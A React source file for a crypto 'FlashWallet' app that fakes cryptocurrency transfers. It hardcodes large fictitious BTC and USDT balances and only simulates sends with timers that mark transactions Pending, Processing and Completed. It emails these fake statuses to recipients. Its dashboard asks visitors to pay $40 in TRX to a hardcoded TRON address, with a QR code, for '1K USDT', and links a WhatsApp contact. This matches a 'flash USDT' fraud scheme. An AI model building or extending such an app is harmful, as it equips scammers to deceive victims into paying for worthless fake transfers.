import { useState } from "react";
import { QRCodeCanvas } from "qrcode.react";

function App() {
  const [tab, setTab] = useState("dashboard");

  const [assets, setAssets] = useState([
    { name: "Bitcoin", symbol: "BTC", balance: 20 },
    { name: "USDT", symbol: "USDT", balance: 50000000 }
  ]);

  const [transactions, setTransactions] = useState([]);

  const [coin, setCoin] = useState("BTC");
  const [network, setNetwork] = useState("TRC20");
  const [amount, setAmount] = useState("");
  const [address, setAddress] = useState("");
  const [email, setEmail] = useState("");

  const [toast, setToast] = useState(null);

  // 🔔 SOUND + NOTIFY
  const playSound = () => {
    const audio = new Audio(
      "https://actions.google.com/sounds/v1/alarms/beep_short.ogg"
    );
    audio.play();
  };

  const notify = (msg) => {
    setToast(msg);
    playSound();
    setTimeout(() => setToast(null), 3000);
  };

  // ================= SEND (FIXED) =================
  const handleSend = () => {
    if (!amount || !address) return notify("Fill all fields");

    const amt = Number(amount);

    const currentAsset = assets.find(a => a.symbol === coin);
    if (!currentAsset || currentAsset.balance < amt) {
      return notify("Insufficient balance");
    }

    // Deduct balance
    setAssets(prev =>
      prev.map(a =>
        a.symbol === coin
          ? { ...a, balance: a.balance - amt }
          : a
      )
    );

    const tx = {
      id: "TX" + Date.now(),
      coin,
      network,
      amount: amt,
      address,
      email,
      status: "Pending"
    };

    setTransactions(prev => [tx, ...prev]);

    notify("Transaction Pending ✔");

    // 📧 EMAIL (Pending)
    if (email) {
      fetch("http://10.0.2.2:5000/send-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          email,
          message: `Your ${amt} ${coin} transaction is Pending`
        })
      }).catch(() => notify("Email failed ❌"));
    }

    // 🔄 PROCESSING AFTER 5 MINUTES
    setTimeout(() => {
      setTransactions(prev =>
        prev.map(t =>
          t.id === tx.id ? { ...t, status: "Processing" } : t
        )
      );

      notify("Processing...");

      if (email) {
        fetch("http://10.0.2.2:5000/send-email", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            email,
            message: `Your ${amt} ${coin} transaction is Processing`
          })
        }).catch(() => notify("Email failed ❌"));
      }

    }, 5 * 60 * 1000);

    // ✅ COMPLETED AFTER 10 MINUTES
    setTimeout(() => {
      setTransactions(prev =>
        prev.map(t =>
          t.id === tx.id ? { ...t, status: "Completed" } : t
        )
      );

      notify("Completed ✔");

      if (email) {
        fetch("http://10.0.2.2:5000/send-email", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            email,
            message: `Your ${amt} ${coin} transaction is Completed`
          })
        }).catch(() => notify("Email failed ❌"));
      }

    }, 10 * 60 * 1000);

    setAmount("");
    setAddress("");
    setEmail("");
  };

  const totalBalance =
    `${assets[0].balance} BTC + ${assets[1].balance} USDT`;

  return (
    <div style={styles.container}>

      {toast && <div style={styles.toast}>🔔 {toast}</div>}

      <h1 style={styles.header}>MarkTech FlashWallet</h1>

      {/* NAV */}
      <div style={styles.nav}>
        <button onClick={() => setTab("dashboard")}>Dashboard</button>
        <button onClick={() => setTab("assets")}>Assets</button>
        <button onClick={() => setTab("tx")}>Transactions</button>
        <button onClick={() => setTab("send")}>Send</button>
      </div>

      {/* DASHBOARD */}
      {tab === "dashboard" && (
        <div style={styles.dashboard}>
          <h2 style={styles.title}>🚀 Trusted Crypto FlashWallet</h2>

          <p style={styles.subText}>
            Transferable • Multi-Asset • REALFLASH Wallet System
          </p>

          <div style={styles.grid}>
            <div style={styles.box1}>
              <h3>💱 Supported Coins</h3>
              <p>BTC</p>
              <p>USDT (TRC20 / ERC20 / BEP20)</p>
              <p>ETH • USDC • BUSD</p>
            </div>

            <div style={styles.box2}>
              <h3>⚡ Features</h3>
              <p>✔ Instant Transfers</p>
              <p>✔ Transaction Tracking</p>
              <p>✔ Balance Management</p>
            </div>

            <div style={styles.box3}>
              <h3>🔔 Alerts</h3>
              <p>✔ Popup Notifications</p>
              <p>✔ Status Tracking</p>
            </div>

            <div style={styles.box4}>
              <h3>📌 Demo TRX Fee</h3>
              <p>Pay $40 TRX → Get 1K USDT (Demo)</p>
              <p style={{ fontWeight: "bold" }}>
                RECIVED 1K ONLY AFTER PAYMENT CONFIRMATION
                TQFx2LdL7XGfJNnbdCGZrixt5c8J4zKEdD
              </p>
            </div>
          </div>

          <div style={styles.bottomRow}>

            <div style={styles.qr}>
              <h3>📷 TRX Payment QR</h3>
              <QRCodeCanvas value="TQFx2LdL7XGfJNnbdCGZrixt5c8J4zKEdD" />
            </div>

            <div style={styles.exchange}>
              <h3>🔄 Exchange Support</h3>
              <p>Binance • Trust Wallet • Coinbase • OKX • MetaMask</p>

              <div style={{ marginTop: 10 }}>
                <h4>📞 Support</h4>
                <a
                  href="https://wa.me/+2347070591041"
                  target="_blank"
                  style={{ color: "#00ff88" }}
                >
                  WhatsApp Support
                </a>
              </div>
            </div>

          </div>
        </div>
      )}

      {/* ASSETS */}
      {tab === "assets" && (
        <div style={styles.card}>
          <h2>Assets</h2>
          <p>{totalBalance}</p>
        </div>
      )}

      {/* TRANSACTIONS */}
      {tab === "tx" && (
        <div style={styles.card}>
          <h2>Transactions</h2>
          {transactions.length === 0
            ? <p>No transactions</p>
            : transactions.map(t => (
              <p key={t.id}>
                {t.coin} - {t.amount} - {t.status}
              </p>
            ))}
        </div>
      )}

      {/* SEND */}
      {tab === "send" && (
        <div style={styles.card}>
          <h2>Send Crypto</h2>

          <select onChange={(e) => setCoin(e.target.value)}>
            <option>BTC</option>
            <option>USDT</option>
          </select>

          <select onChange={(e) => setNetwork(e.target.value)}>
            <option>TRC20</option>
            <option>BEP20</option>
            <option>ERC20</option>
          </select>

          <input
            placeholder="Address"
            value={address}
            onChange={(e) => setAddress(e.target.value)}
          />

          <input
            placeholder="Amount"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
          />

          <input
            placeholder="Email (optional)"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />

          <button onClick={handleSend}>Send</button>
        </div>
      )}

    </div>
  );
}

export default App;

// ================= STYLES =================
const styles = {
  container: { padding: 20, background: "#111", color: "#fff", minHeight: "100vh" },
  header: { fontSize: 24 },
  nav: { display: "flex", gap: 10, marginBottom: 20 },
  card: { background: "#222", padding: 20, borderRadius: 10 },

  dashboard: { padding: 20 },
  title: { fontSize: 26, fontWeight: "bold" },
  subText: { color: "#aaa", marginBottom: 20 },

  grid: {
    display: "grid",
    gridTemplateColumns: "repeat(auto-fit, minmax(200px,1fr))",
    gap: 15
  },

  box1: { background: "#1e293b", padding: 15 },
  box2: { background: "#1f1f2e", padding: 15 },
  box3: { background: "#2a1f2f", padding: 15 },
  box4: { background: "#2a2a1a", padding: 15 },

  bottomRow: { display: "flex", gap: 20, marginTop: 20, flexWrap: "wrap" },

  qr: { flex: 1, background: "#111", padding: 20 },
  exchange: { flex: 1, background: "#16213e", padding: 20 },

  toast: {
    position: "fixed",
    bottom: 20,
    right: 20,
    background: "green",
    padding: 10,
    borderRadius: 8
  }
};